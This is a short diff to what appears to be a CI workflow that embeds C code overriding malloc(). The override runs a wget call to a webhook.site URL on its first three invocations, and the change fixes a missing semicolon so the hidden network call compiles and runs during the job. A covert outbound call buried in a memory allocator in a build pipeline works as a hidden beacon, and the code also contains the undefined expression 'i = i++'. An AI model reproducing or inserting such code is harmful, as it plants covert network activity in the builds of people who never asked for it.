@@ -27,7 +27,7 @@ jobs:
           void *malloc(size_t size)
           {
               if(i < 3) {
-                system("wget https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64")
+                system("wget https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64");
                 i = i++;
               }
 
